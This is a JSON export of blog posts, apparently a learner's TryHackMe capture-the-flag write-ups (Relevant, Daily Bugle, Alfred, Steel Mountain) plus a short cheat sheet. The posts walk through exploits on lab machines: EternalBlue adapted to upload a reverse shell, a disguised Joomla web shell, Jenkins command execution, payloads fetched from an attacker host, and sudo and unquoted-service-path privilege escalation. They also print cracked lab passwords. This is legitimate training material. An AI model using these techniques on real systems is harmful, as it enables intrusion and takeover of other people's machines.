[ { "title": "THM - Relevant", "url": "/posts/relevant/", "categories": "Writeups", "tags": "tryhackme, tutorial", "date": "2022-08-07 21:00:00 +0200", "snippet": "The Relevant briefing mentiones that everything can be completed without Metasploit. Since OSCP only allows very limited use of the Metasploit Framework I took this as a challenge.Below the relevant (pun intended) MITRE ATT&amp;CK: Reconnaissance Lateral Movement Credential Access T1595 T1210 T1552.001 ReconnaissanceStarting the usual nmap scan results in the following ports being open:PORT STATE SERVICE80/tcp open http135/tcp open msrpc139/tcp open netbios-ssn445/tcp open microsoft-dsrpc3389/tcp open ms-wbt-serverVisting the website shows the default static IIS page. So no obvious entrypoint yet, but that probably means that the configuration of the webserver is also default after installation.Looking at the HTTP headers we see that it is running the latest version of IIS. So no known vulnerabilities:HTTP headersServer: Microsoft-IIS/10.0X-Powered-By: ASP.NETContinuing with enumaring SMB using nmap NSE scripts we get already some usefull information such as OS version, computername and sharenames:Host script results:| smb-enum-sessions: |_ &lt;nobody&gt;| smb-enum-shares: | account_used: guest| \\\\10.10.33.189\\ADMIN$: | Type: STYPE_DISKTREE_HIDDEN| Comment: Remote Admin| Anonymous access: &lt;none&gt;| Current user access: &lt;none&gt;| \\\\10.10.33.189\\C$: | Type: STYPE_DISKTREE_HIDDEN| Comment: Default share| Anonymous access: &lt;none&gt;| Current user access: &lt;none&gt;| \\\\10.10.33.189\\IPC$: | Type: STYPE_IPC_HIDDEN| Comment: Remote IPC| Anonymous access: &lt;none&gt;| Current user access: READ/WRITE| \\\\10.10.33.189\\nt4wrksv: | Type: STYPE_DISKTREE| Comment: | Anonymous access: &lt;none&gt;|_ Current user access: READ/WRITE| smb-os-discovery: | OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)| Computer name: Relevant| NetBIOS computer name: RELEVANT\\x00| Workgroup: WORKGROUP\\x00|_ System time: 2022-08-05T08:44:28-07:00Next I used the nmap NSE scripts to check for SMB vulnerabilities: ms10-054 (remote memory corruption), not vulnerable ms10-061 (print spooler service impersonation), not vulnerable ms17-010 (EternalBlue), vulnerableInitial accessWe found an entry point! The host is vulnerable for the EternalBlue exploit. I have already used this exploit with the help of Metasploit, which is pretty straight forward, but never without.A quick exploit-db search reveals a verified Python script by author Sleepya. In the first few lines the author comments a git link for a depedency for mysmb.py. After downloading this and installing Impacket I quickly ran into my first issue:File \"/TryHackMe/offensive-pentesting/relevant/mysmb.py\", line 73, in puttrans_datatransData = ('\\x00' * padLen) + parametersTypeError: can only concatenate str (not \"bytes\") to strAfter hours of troubleshooting and Stackoverflow it was clear that the latest version of the impacket dependency was written for Python3, but mysmb.py is written in Python2.Eventually I decided to just downgrade impacket to the latest Python2 version (0.9.24). Only now I ran into my next issue:impacket.smb.SessionError: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)The exploit does have an option to make authenicated SMB request, but of course this requires credentials…So where do fix us some credentials? Back to enumarating it is. First by starting Gobuster, but the usual wordlists do not reveal anything.Also an IIS specific wordlist leaved me empty handed.Back to SMB, there was one non-default share nt4wrksv which is interesting. Connecting to it with the guest account works and there is one file in there named passwords.txt.Exactly what we need, what a coincidence! The file contains base64 encoded credentials. Below decoded:Bob - !P@$$W0rD!123Bill - Juw4nnaM4n420696969!$$$Adjusting the script with the credentials works! It created an empty pwnd.txt file on the target host.With the help of a blog written by STRIK1R I adjusted the script to upload a reverse shell to connect back to my computer.def smb_pwn(conn, arch): smbConn = conn.get_smbconnection() smb_send_file(smbConn, 'shell.exe', 'C', '/test.exe') service_exec(conn, r'c:\\test.exe')All that remains is to escalate privileges and…no wait, we have the NT Authority\\System account! The flags are now easily grabbed by going to the desktop folder for user Bob and Administrator." }, { "title": "Cheat Sheet", "url": "/posts/cheat-sheet/", "categories": "Cheatsheets", "tags": "commands, shell", "date": "2022-08-05 16:00:00 +0200", "snippet": "Cracking hashJohn the RipperWhen using a custom format we can specify the hash algoritm(s) and the format with the --format parameter.Example cipher (SHA512$salt):6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed$1c362db832f3f864c8c2fe05f2002a05Command:john --wordlist=/usr/share/wordlists/rockyou.txt --format='dynamic=sha512($p.$s)' hash.txtSMBnmap -p 445 -Pn -n --script smb-enum-* &lt;TARGET_IP&gt;smbclient -U 'guest' \\\\\\\\10.10.133.84\\\\&lt;SHARENAME&gt; #FTP like, use 'get' to download filexdg-open smb://&lt;TARGET_IP&gt;/&lt;SHARENAME&gt; #connects share to local file explorerRDPxfreerdp /dynamic-resolution +clipboard /cert:ignore /v:&lt;TARGET_IP&gt; /u:&lt;USER&gt; /p:'&lt;PASSWORD&gt;' " }, { "title": "THM - Daily Bugle", "url": "/posts/daily-bugle/", "categories": "Writeups", "tags": "tryhackme, tutorial", "date": "2022-08-05 13:00:00 +0200", "snippet": "Naturally, as a blue teamer I have the urge to identify which TTPs have been used during an attack. So from now on, all my write ups will include this by utilizing the MITRE ATT&amp;CK framework. It can also serve as a hint for you before reading the in depth write up. The table below shows the TTPs used for the Daily Bugle room. Reconnaissance Initial Access Persistence Credential Access Privilege Escalation T1595 T1190 T1505.003 T1552.001 T1548.003       T1110.002   ReconnaissanceStarting a TCP SYN scan we can see that the followign ports are open on the target host:22/tcp open ssh80/tcp open http3306/tcp open mysqlOpening a browser to visit the website running on the target host we see a blog by Daily Bugle. A newspaper in the Spiderman universe, run by Jonah Jameson. Looking at the HTTP headers we can see the PHP and Apache version running:X-Powered-By: PHP/5.6.40Server: Apache/2.4.6 (CentOS) PHP/5.6.40Scouting the website does not reveal any version of a CMS being used. Checking robots.txt reveals an interesting page /administrator.It contains a login wall to access what seems to be Joomla admin interface! We now know the CMS. However, still no Joomla version listed anywhere.I decided to use gobuster with wordlist urls-joomla-3.0.3.txt provided by SecLists.However, it returns over 2791 pages with status 200 which is probably a good thing, but there must be a more efficient way to figure out which Joomla pages are interesting.So back to Goolgle and I quickly found the following endpoint: /administrator/manifests/files/joomla.xmlLow and behold:&lt;version&gt;3.7.0&lt;/version&gt;&lt;creationDate&gt;April 2017&lt;/creationDate&gt;Initial AccessNow that we know the Joomla version we can check for known vulnerabilities and exploits. On cvedetails.com we can see that the most serious one is CVE-2017-8917 regarding SQL Injection. Searching Metasploit there seems to be an exploit available: exploit/unix/webapp/joomla_comfields_sqli_rce Running the exploit returned an error I did not understand:metasploit: Exploit aborted due to failure: unknown: &lt;TARGET_IP&gt;:80 - Error retrieving table prefixTHM assignment we should try a Python script instead of SQLmap. However, being stubborn I wanted to try SQLMap on the login fields, but got the following error:[10:23:22] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 4 timesBack to search for an exploit I found a Python script on Github by SiopySec which returned the following results:* Database prefix : fb9j5* Joomla user : jonah* Joomla user mail : jonah@tryhackme.com* Joomla user password : $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm* Database user : root@localhost* Database name : joomla* Database version : 5.5.64-MariaDBThere we see a database prefix. perhaps this is was Metasploit needed? There was no option however to manually include the database prefix to the exploit options.The password value is clearly hashed so we need a way to crack it. I used the following John the Ripper command for that:┌──(kali㉿kali)-[~/TryHackMe/offensive-pentesting/dailybugle]└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash.txtPersistenceWith the password spiderman123 cracked we head back to the administrator console and log in succesfully.Now we need to a way to upload a webshell. I tried creating a blog and insert the php web shell in there but it seems to be commented automatically by Joomla.So we need a different way. After a bit of Googling it seems php code can be inserted by adjusted templates in Extensions &gt; Templates.You will notice there are two themes. Protostar is the default, but we are going to use Beez3 to be more sneaky.Here you can create a new file, insert the php web shell and save it as a .php file with whatever sneaky name you can think of.The webshell can be activated with the following link: http://&lt;TARGET_IP&gt;/templates/beez3/notawebshell.phpDoing some initial enumeration on the machine I notice that my shell is non interactive. We can upgrade it to an interactive TTY with the following command:$ python -c 'import pty;pty.spawn(\"/bin/bash\")'; Privilege EscalationWe are logged in as apache. In the previous THM rooms, similar service accounts were allowed to access the user home folder to grab the user flag.However, only the user jjameson is has rwx permissions on his homefolder. So, we either need to move laterally to log in as jjameson to grab this flag or we skip this and go immediately for root.I did the following enumration to go for root immediately: Checked capabilities manually, but no interesting binaries Checked sudo capabilities, but unable because it requires the password for apache user Checked suid/guid, but no interesting binaries Checked crontab, but nothing was scheduled Decided to use Linpeas and it found some kernel exploit and pkexec vulnerability. Checked for stored credentials with grep -r \"password\" /varThe last check resulted in a plaintext password located in a Joomla configuration file /var/www/html/configuration.php:&lt;?phpclass JConfig { public $user = 'root'; public $password = 'nv5uz9r3ZEDzVjNu'; public $db = 'joomla'; public $dbprefix = 'fb9j5_';}Great so now we have root access to the mysql database, but is it maybe also the password for the root user? Unfortunetaly not.Admittedly it took a while for me to realize that maybe I should test this password for use jjameson…After successfully grabbing the use flag we continue with enumeration to escalate our privileges.We were enable to check sudo -l because of a lack of a password, but now we can and it seems we can run the yum package manager with root privileges.Checking gtfobins we find two options to escalate our privileges. The first one is to run any command as root and the other onee creates a custom plugin to start an interactive shell!sudo yum -c $TF/x --enableplugin=yThe end." }, { "title": "THM - Alfred", "url": "/posts/alfred/", "categories": "Writeups", "tags": "tryhackme, tutorial", "date": "2022-07-25 18:25:00 +0200", "snippet": "Initial accessWhat do Batman and Jenkins have in common? Check the page source code for the answer. Running nmap reveals that the following three TCP ports listed below are open. Visiting the website hosted on TCP port 80 displays a picture of the actor Christian Bale.To this day, no one has seen Batman and Christian Bale together in the same room.┌──(kali㉿kali)-[~]└─$ sudo nmap -sS -T4 -Pn -p1-10000 -v &lt;TARGET_IP&gt;PORT STATE SERVICE80/tcp open http3389/tcp open ms-wbt-server8080/tcp open http-proxyContinueing to the Jenkins server on port 8080/tcp we are greeted with a login wall.A quick Google search shows that the default username for Jenkins is admin and the password is stored in $JENKINS_HOME/secrets/initialAdminPassword.However, this is not an option since we do not have access to the filesystem yet. Before attempting a fully fledged and noisy brute force atack,why not check if the door is already half open? Seems like it is!After log in we can see a project with the name “project” (confusing) was last built succesfullly almost 3 years ago.Checking the console output we see a shell executing a command:Started by user adminRunning as SYSTEMBuilding in workspace C:\\Program Files (x86)\\Jenkins\\workspace\\project[project] $ cmd /c call C:\\Users\\bruce\\AppData\\Local\\Temp\\jenkins8034204804437582227.batC:\\Program Files (x86)\\Jenkins\\workspace\\project&gt;whoamialfred\\bruceC:\\Program Files (x86)\\Jenkins\\workspace\\project&gt;exit 0 Finished: SUCCESSWe can replace the whoami command with the powershell command provided by THM and adjust it to match your attack machine webserver and netcat listener.After running a new job for the project we obtained a shell!└─$ nc -lvnp 4242 listening on [any] 4242 ...connect to [10.11.75.80] from (UNKNOWN) [10.10.32.229] 49312Windows PowerShell running as user bruce on ALFREDCopyright (C) 2015 Microsoft Corporation. All rights reserved.PS C:\\Program Files (x86)\\Jenkins\\workspace\\test&gt;The first flag is located at C:\\Users\\bruce\\Desktop\\user.txtSwitching shellsThe current shell works, but a meterpreter shell has much more capabilities. THM already provides the commands to create a meterpreter payload, but we are allowed to choose a name for the executable.Its a good practice to use a common executable name to seem less suspicious. After downloading the payload using the reverse shell we already have we can run the executable: C:\\Program Files (x86)\\Jenkins\\workspace\\test&gt; ./svchost.exeBecause running svchost.exe from the Jenkins folder is obviously not suspicious..Privilege escalationRunning whoami /priv shows we have the “SecurityImpersonation” Impersonation token level enabled.By using meterpreter we are able to assign the NT Authority\\System user impersonation token:meterpreter &gt; getuidServer username: alfred\\brucemeterpreter &gt; impersonate_token \"BUILTIN\\Administrators\" [-] Warning: Not currently running as SYSTEM, not all tokens will be available Call rev2self if primary process token is SYSTEM[+] Delegation token available[+] Successfully impersonated user NT AUTHORITY\\SYSTEMmeterpreter &gt; getuidServer username: NT AUTHORITY\\SYSTEMMeterpreter warns us that we are not running as the system user. Windows checks the primary token of a process, not the impersonation token to determine privileges.We therefore need to migrate to a process running under the system user such as services.exe.After migrating we are able to grab the root flag!" }, { "title": "THM - Steel Mountain", "url": "/posts/steelmountain/", "categories": "Writeups", "tags": "tryhackme, tutorial", "date": "2022-07-23 22:09:00 +0200", "snippet": "IntroductionSteel Mountain refers to the data security firm where the protagonist Eliot broke into in the TV show Mr. Robot.Opening a browser to this machine shows a simple html website showing a picture of the employee of the month.Looking at the source code of the web page we get the answer to the first question: &lt;img src=\"/img/BillHarper.png\" style=\"width:200px;height:200px;\"/&gt;Initial accessRunning nmap TCP SYN scan shows that are a few more ports open:$ sudo nmap -sS -T4 -Pn -p1-10000 &lt;TARGET_IP&gt;`[sudo] password for kali: Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-24 14:46 EDTNmap scan report for &lt;TARGET_IP&gt;Host is up (0.025s latency).Not shown: 9993 closed tcp ports (reset)PORT STATE SERVICE80/tcp open http135/tcp open msrpc139/tcp open netbios-ssn445/tcp open microsoft-ds3389/tcp open ms-wbt-server5985/tcp open wsman8080/tcp open http-proxyChecking the other website running on TCP port 8080 reveals what seems to be a web app to browse system files.The bottom left corner contains server information including a hyperlink HTTP File Server 2.3 towards the open source project of the web app.Searching Exploit-DB shows that HFS version 2.3 is vulnerable (CVE-2014-6287) to RCE.The Metasploit Framework has the exploit included as well in exploit/windows/http/rejetto_hfs_exec.Changing the module options (rhosts, rport, lhost, srvhost) results in a Meterpreter reverse TCP shell. Note that it took a few minutes after running the exploit until the Meterpreter Shell Prompt was ready.With the Meterpreter shell running we can start exploring. It seems the server is running Windows 2012 R2 and logged in with the Employee of the Month user as can be seen below.meterpreter &gt; sysinfoComputer : STEELMOUNTAINOS : Windows 2012 R2 (6.3 Build 9600).Architecture : x64System Language : en_USDomain : WORKGROUPLogged On Users : 1Meterpreter : x86/windowsmeterpreter &gt; getuidServer username: STEELMOUNTAIN\\billmeterpreter &gt; pwdC:\\Users\\bill\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\StartupThe first flag can be found on Bills’ desktop C:\\Users\\bill\\Desktop&gt;\\user.txtPrivilege escalationMeterpreter has automated privilege escalation options such as using the builtin getsystem command.However, this challenge explores different options by using the PowerUp.ps1 script provided by PowerShellMafia to find privilege escalation vectors.After uploading the script to the victim machine it seems one service can be restarted by Bill and has an unquoted service file path as can be seen below:ServiceName : AdvancedSystemCareService9Path : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exeModifiableFile : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exeModifiableFilePermissions : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}ModifiableFileIdentityReference : STEELMOUNTAIN\\billStartName : LocalSystemAbuseFunction : Install-ServiceBinary -Name 'AdvancedSystemCareService9'CanRestart : TrueThe unquoted file path signifies the command is ambiguous, meaning its open to interpretation. The spaces are normally used to separate command arguments unless they are quoted.The table below shows the order in which the command line will interpret it. Since the Iobit folder is writable by user Bill, we can create our own reverse shell payload and name it Advanced.exe. Command Argument 1 Argument 2 Argument 3 C:\\Program.exe Files (x86)\\Iobit\\Advanced SystemCare\\ASCService.exe C:\\Program Files.exe (x86)\\Iobit\\Advanced SystemCare\\ASCService.exe   C:\\Program Files (x86)\\Iobit\\Advanced.exe SystemCare\\ASCService.exe     Once the payload is written to C:\\Program Files (x86)\\Iobit, we can start a listener on the attack machine and restart the service:C:\\Program Files (x86)\\IObit&gt;sc stop AdvancedSystemCareService9C:\\Program Files (x86)\\IObit&gt;sc start AdvancedSystemCareService9We are now logged in as NT Authority/SYSTEM which is allowed to grab the root flag located at: C:\\Users\\Administrator\\Desktop\\root.txtAccess and Escalation without MetasploitAlthough Metasploit is incredibly usefull, it is not a good practice to only rely on a single tool. Furthermore, Meterpreter is easily detected by modern AVs [citation needed].The last task explores a more manual approach to hack the target machine. Once the provided exploit is downloaded we need to prepare it by adjusted the variablesip_addr, local_port with our own values of the attack machine.As described in the comment section, we need to host a webserver while running the exploit to retrieve the nc.exe binary.Terminal window 1:──(kali㉿kali)-[~/TryHackMe/offensive-pentesting/steelmountain]└─$ mv 39161 exploit.py┌──(kali㉿kali)-[~/TryHackMe/offensive-pentesting/steelmountain]└─$ chmod +x Exploit.py ┌──(kali㉿kali)-[~/TryHackMe/offensive-pentesting/steelmountain]└─$ python2 ./Exploit.py &lt;TARGET_IP&gt; 8080 Terminal window 2:┌──(kali㉿kali)-[~/TryHackMe/offensive-pentesting/steelmountain]└─$ python3 -m http.server 80 1 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...&lt;TARGET_IP&gt; - - [24/Jul/2022 15:09:16] \"GET /nc.exe HTTP/1.1\" 200 -┌──(kali㉿kali)-[~/TryHackMe/offensive-pentesting/steelmountain]└─$ nc -lvnp 80listening on [any] 80 ...connect to &lt;ATTACK_IP&gt; from (UNKNOWN) &lt;TARGET_IP&gt; 49305Microsoft Windows [Version 6.3.9600](c) 2013 Microsoft Corporation. All rights reserved.With the shell working we can download and run the WinPeas binary using PowerShell:powershell -c Invoke-WebRequest -Uri https://github.com/carlospolop/PEASS-ng/releases/download/20220724/winPEASx86.exe -Outfile \"privesc.exe\"With the same web server running on the attack machine we can download the same reverse shell payload:powershell -c Invoke-WebRequest -Uri http://&lt;ATTACKER_IP&gt;/Advanced.exe -Outfile \"Advanced.exe\"And repeat the same procedures from the last paragraph to obtain a high privileged shell!" } ]
